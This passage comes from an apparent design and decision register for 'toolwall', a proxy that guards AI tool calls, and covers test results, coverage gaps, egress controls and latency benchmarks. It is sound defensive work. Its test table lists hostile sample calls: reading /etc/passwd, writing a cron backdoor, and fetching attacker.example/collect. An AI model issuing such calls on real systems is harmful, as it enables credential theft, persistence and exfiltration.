A new file under those directories fails the suite until somebody classifies it; a module that is
neither reachable nor declared opt-in fails it. **Both modules would have failed the reachability
check on the day they landed.** Verified by adding a dead `src/policy/dead-experiment.ts` and
watching the suite go red, then removing it.

What it does not claim: that a reachable module is correct, or that a guard is registered on the
right leg. `response-guards-e2e.test.ts` and `inference-provenance-e2e.test.ts` prove behaviour.
This file proves only that nothing on disk was silently forgotten.

### C-23
**Inference is default-ON, and every claim is paired against the same call with inference off.**
Status: **resolved**

`test/integration/inference-provenance-e2e.test.ts` drives a real spawned fixture
(`test/fixtures/capability-server.mjs` — an entirely legitimate server) through the assembled proxy.
Every "with inference" assertion is paired with the same call under `enable: { inference: false }`,
so the improvement is measured against the real day-zero baseline rather than asserted against
nothing:

| Call, with NO policy file | Inference ON | Inference OFF |
|---|---|---|
| `read_file({ path: "/etc/passwd" })` | **blocked on the request leg** | allowed, `read:/etc/passwd` returned |
| `write_file({ destination: "/etc/cron.d/backdoor" })` | **blocked** | allowed, `wrote:` returned |
| `fetch_url({ url: "file:///etc/passwd" })` | **blocked** (scheme) | allowed, `fetched:` returned |
| `fetch_url({ url: "https://attacker.example/collect" })` | allowed — the documented gap | allowed |

The last row is asserted as a **miss**, not omitted: inference cannot invent a host allowlist, and a
declared `egress` block is still what catches exfiltration to an unlisted host. The same test proves
that block works, so "inference is a floor, not a ceiling" is a measured claim.

False-positive side, also through the assembled proxy: a read inside the workspace root, a two-number
`add`, `http://127.0.0.1:3000`, and the C-7 `git_diff` anchor case are all untouched. The full suite
— **846 tests** including the 59-case benign corpus — passes unchanged with inference default-ON,
which is the strongest available restatement of the 0.0% false-positive measurement.

**Precedence verified through the assembled path**, not against the module: a policy declaring
`filesystem.read: ["/etc"]` for this server makes `read_file({ path: "/etc/passwd" })` succeed, and
in the same session `fetch_url({ url: "file://..." })` is still blocked — inference stands down per
capability, not wholesale.

### C-24
**Provenance is opt-in, and the default path makes zero network calls.**
Status: **resolved**

Asserted against the **real global `fetch`**, replaced with a recorder for the duration of a full
assembled session, rather than against an injected `fetchImpl`. An injected stub cannot observe a
call made by something that never took one, and the claim being defended is about the binary.

- No `provenance` option: `toolwall.provenance` is `undefined`, no `toolwall/provenance-*` finding
  appears anywhere, zero fetch attempts.
- `provenance: { network: "offline" }`: a real `pinned` event from the real pin guard drives the
  observer, `toolwall/provenance-not-checked` reaches the real audit sink, zero fetch attempts.
- A `server.json` `fileSha256` against a real local artifact produces
  `provenance-file-hash-verified`, and against tampered bytes `provenance-file-hash-mismatch`
  (`critical`) — fully offline, fully deterministic, and the one check in the module entitled to the
  word "verified".
- `network: "allow-registry-lookups"` changes the `not-checked` **reason** from *"registry lookups
  are off"* to *"no package could be resolved from the spawn spec"*, which is what proves the flag
  propagated through argv → `parseProvenanceArgs` → `assembleToolwall` → the observer rather than
  being dropped somewhere in between.

`--provenance-bundle` alone turns the feature on and leaves the network off; the CLI banner says
which of the two postures you are in, and `test/integration/cli.test.ts` asserts both strings.

### C-27
**Reachability is checked against both entry points — for transports only.**
Status: **binding**

`src/index.ts` is the library entry; `src/cli/index.ts` is the `bin`. The Streamable HTTP listener
is constructed only by the binary, so a walk rooted at the library entry alone would call it dead.
Transport modules are therefore checked against **both** roots, in a test that says so in its name.

`guards/`, `policy/` and `audit/` are deliberately still checked against `src/index.ts` alone — that
is where `assembleToolwall` lives and where all three dead-code recurrences happened, and widening
their root set would weaken exactly the assertion C-22 exists to make.

---

## Coverage limits

### C-7
**Three gaps, stated so they are not mistaken for coverage.**
Status: **open**

- Relative path arguments resolve against a single `baseDir`; repo-relative pathspecs (e.g.
  `git_diff.paths`) must NOT be bound to a path role — a wrong binding is a self-inflicted false
  positive. Per-argument resolution bases are a follow-up.
- **No DNS resolution**, so an allowlisted hostname resolving to a private address is not caught.
  Deliberate: hot path plus the zero-network guarantee, and DNS rebinding would defeat it anyway.
- `path.resolve` collapses `..` **lexically**, so it cannot be used for symlink containment: given
  `<root>/link -> /elsewhere`, it turns `<root>/link/../etc` into `<root>/etc`, which looks
  contained and is not. Containment must walk segment-by-segment, resolving links link-by-link.

### C-16
**Egress is a proxy-level control, and the docs say what it does not cover.**
Status: **binding**

Per-server `egress` constrains **what the model can direct a tool to reach**. It does not and cannot
constrain what a compromised server opens on its own sockets — toolwall reads JSON-RPC messages, it
does not own the server's network namespace. The F-1 **0.995** figure in `docs/research-brief.md`
§4.2 comes from observing actual traffic and is **not** a number this control earns.

That distinction is stated in `src/policy/egress.ts`, in `src/policy/schema.ts`, and in the README
under both "Egress allowlisting" and "What toolwall does NOT do". Do not let it be dropped from any
of the four.

Verified end to end with three cases against a real spawned server: a non-allowlisted host **blocked
on the request leg** before the server ran; an allowlisted host untouched; and — the claim
`docs/positioning.md` rests on — **no policy file means nothing is denied**, because `enforce: "off"`
until an operator declares a block is what keeps the day-zero false-positive rate at 0.0%.

The URL role came from the tool's own `format: "uri"`, never from guessing that a property named
`url` holds one (`evidence.discovery === "role"`).

One honest note: the denied **hostname** does reach the client, inside `remediation` ("add
`attacker.example` to `servers[...].egress.hosts`"). Deliberate — an operator cannot act on a
remediation that will not name the host — and bounded, because the value survived URL parsing and so
is a syntactically valid hostname that cannot carry prose. It is also `sanitizeRenderedText`d
(C-14a).

---

## Performance

### C-8
**Baselines are re-measured, never copied forward. Strict must never be the default.**
Status: **resolved** (superseded by C-28 for the latency half; the FP half stands)

Transport-only added latency, 1000 sequential `tools/call`, zero guards:
`p50 +0.140 ms · p95 +0.172 ms · p99 +0.421 ms`.

Benign-corpus false positives, 59 cases:

| Configuration | Blocked | Friction |
|---|---|---|
| **balanced (default)** | **0.0%** | **0.0%** |
| strict + policy | 1.7% | 47.5% |
| **strict + no policy** | **100%** | — |

Strict with no policy blocks everything because the tier sets `unknownTool: "block"`; `parsePolicy`
warns. **Strict must never be the default.**

### C-11
**The measured latency claim, revised three times as the workloads got honest.**
Status: **resolved** (superseded by C-28)

Full tables are in `docs/performance.md`. The register keeps the sequence, because the sequence is
the finding:

1. **First measurement.** 1000 sequential `tools/call` through the full guard stack, added p99
   `+0.594 / +0.319 / +0.403 ms` across three runs, characterised as "within the 5 ms budget by
   roughly an order of magnitude". The workload was a **9-byte** echo through request-leg guards
   only.
2. **Re-measured after the response leg landed.** `measure()` and `hasProtoKey()` each walk every
   `tools/call`, `resources/read` and `prompts/get` result, and `scanSurface()` walks every listing.
   A 9-byte probe hides that entirely, so the benchmark gained a 64 KiB workload. Worst observed
   added p99: **+4.348 ms against a 5 ms budget** — about 0.65 ms of headroom, not 4.4 ms. The
   "order of magnitude" characterisation no longer held. Two runs reporting added p99 of 44.6 ms and
   138.4 ms were **discarded as host noise, not as toolwall's cost**: the *direct* baseline in those
   runs showed p99 of 24 ms and 87 ms and maxima of 111–264 ms, and the zero-guard proxy 173 ms, on
   a machine at load average 61.
3. **Re-measured again, on node count.** The predicted fix — fusing `measure()` and `hasProtoKey()`
   into one walk to "roughly halve the large-result cost" — **was wrong, for a reason worth
   recording**: the 64 KiB workload arrives as ONE string inside two objects, about **six nodes**.
   Both walks finish it in microseconds however many times they run. **The response-leg cost scales
   with node count, not byte size**, and the benchmark had no node-heavy case. Adding one
   (`wide`: 2,000 structured rows, ~12k nodes, ~219 KiB) put the added p99 at
   **+5.123 … +7.260 ms — OVER on all four runs**, and `npm run bench` started exiting non-zero.
   The fusion did help where it applied: isolated, on 12,007 nodes / 219 KiB, **−20.2% mean and
   −24% p99**; on the ~6-node payload, **−2.8%, i.e. nothing**.

`measureAndScan` also drops the per-node `{ v, d }` frame allocation in favour of two parallel
stacks, and turns the `__proto__` check into one `hasOwnProperty` call per object instead of a
second traversal and a second `getOwnPropertyNames` allocation. The proto scan now shares
`measure`'s 200k node cap rather than its own 50k one — four times the coverage in the same
fail-open direction. `hasProtoKey` stays exported and tested; it is simply no longer on the hot path.

The flat budget itself was retired by C-28.

### C-28
**The flat 5 ms budget is retired and replaced with a measured curve, gated on the mean.**
Status: **binding**

C-11 attributed the `wide` overrun to "the extra process hop and the JSON re-serialization". **Half
of that attribution was wrong**, and the benchmark now proves it with a fourth configuration.

**`pipe`** is a raw byte relay: two `PassThrough`s splicing the child's stdio to the client, parsing
nothing and guarding nothing. Same topology, same process, same stream primitives as the zero-guard
proxy, with the JSON-RPC codec deleted. It is the physical floor for interposition, and it
decomposes added latency into three layers with three different owners. The table is in
`docs/performance.md`.

**The process hop is not the cost.** `relay` is ±0.45 ms across a 9-byte-to-860-KiB range with no
trend — **interposition is free**. The cost is the codec: one extra parse and one extra re-serialize
per leg. There is no proxy design in any language that both reads a payload and avoids it. **A flat
sub-5 ms budget was below the floor, not merely unmet**, and it survived three weeks only because no
workload had enough nodes to expose it.

The replacement, with constants fixed in `bench/latency.ts` and **not** refitted per run — a budget
that refits itself always passes and detects nothing:

```
added mean ≤ 0.70 ms + 0.03 ms/KiB + 0.16 ms per 1 000 nodes
```

Two further decisions, both about making the budget *believed*:

- **The mean gates; p99 is printed, not enforced.** p99 over 1000 samples is ten samples, across
  four process configurations and a GC. Run-to-run p99 moved by more than the entire guard cost
  being measured. Gating on it would manufacture exactly the unreproducible red that teaches a team
  to stop reading CI.
- **The benchmark detects its own contamination.** Run at load average 42 it reported `relay` at
  **−5.03 ms**: a byte splice apparently faster than no splice, which is impossible and means the
  baseline was squeezed while the guarded runs were not. Every derived number in such a run is
  meaningless *and plausible*, which is the dangerous combination. `npm run bench` exits non-zero
  with `RUN CONTAMINATED` when `relay < −0.75 ms` rather than printing a summary table someone might
  quote.

CI runs the benchmark and never gates on it (`.github/workflows/ci.yml`), for the same reason.

### C-29
**The node cap fails OPEN, and `Buffer.byteLength` is ~34% of the walk.**
Status: **resolved** (the fail-open) / **open** (the walk cost)

Both findings are in `src/guards/runtime/capability-guard.ts`.

**1. The node cap failed OPEN — RESOLVED.** `walk()` stops at `nodeCap` (200 000) with `break`,
returning a partial `ScannedShape`. Two consequences, both silent at the time: `protoKey` was
`false` rather than "unknown", so a `__proto__` key beyond the cap was not reported; and
`totalBytes` was under-measured, so `resultBoundsFindings` could not fire `maxTotalBytes` on the
very payloads most likely to breach it. **A result large enough to defeat inspection was trusted
*more* than a small one** — the one place where "bounded so measurement cannot be weaponised" and
"fail closed" disagreed.

Fixed by surfacing truncation on the returned shape: `ArgumentShape.truncated` is now set by
`walk()`, and `ResultGuard` blocks on it via `notFullyInspected()` — `toolwall/bounds.not-fully-inspected`
and `toolwall/result.bounds.not-fully-inspected`, severity `high`. The finding is deliberately
**not** phrased as "this payload is too big", because toolwall does not know that; it says that it
stopped, and that every bound above is a lower bound and the `__proto__` scan covered only part of
the tree. The node cap stays a fixed anti-DoS bound, not a policy knob — raising `bounds` will not
make an uninspectable payload inspectable. Read `truncated` before trusting any number the shape
returns.

**2. `Buffer.byteLength` is ~34% of the walk, and is avoidable.** Measured on the `wide` payload
(12 007 nodes, 217 749 bytes), 3 000 iterations after 300 warmup:

| Variant | p50 | p99 | mean | vs current |
|---|---|---|---|---|
| current (`Buffer.byteLength` per string and per key) | 0.8236 | 1.1334 | 0.8590 | — |
| memoise key lengths in a `Map` | 0.5896 | 1.0844 | 0.6217 | −27.6% |
| **manual UTF-8 length, ASCII fast path** | **0.5319** | **0.7643** | **0.5657** | **−34.1%** |
| memo + manual | 0.5469 | 0.7786 | 0.5835 | −32.1% |
| memo + manual + level-order traversal | 0.5074 | 0.7919 | 0.5406 | −37.1% |

All four variants were checked to return byte-identical `ScannedShape` output to the current
implementation on the test payload before being timed. The winner on simplicity-per-gain is the
third: replace `Buffer.byteLength(s, "utf8")` with a hand-rolled length that adds 1 for `< 0x800`,
2 otherwise, and 2 with an index skip for a high surrogate. The key memo is redundant once that
lands (keys are short and ASCII), and the level-order rewrite buys 3% more for a structural change —
not worth it.

**Expected end-to-end effect, stated so it is not oversold:** the walk is ~1.0 ms of the +2.70 ms
guard column on `wide`, so −34% of it is ≈0.35 ms off a +5.85 ms total. Real, free, and small. It
does not change the C-28 conclusion, because the codec — which is not ours — is the term that
dominates.

**Measured and rejected:** skipping the response-leg re-serialization when no guard mutated the
payload. `JSON.stringify` of the 219 KiB `wide` result is 0.33 ms p50 / 0.65 ms p99 against a codec
cost of 3.48 ms mean, so forwarding the original bytes would recover under 10% of the layer it
targets while requiring the transport to retain every raw frame. Not worth the coupling. Recorded
so it is not re-proposed as an obvious win.
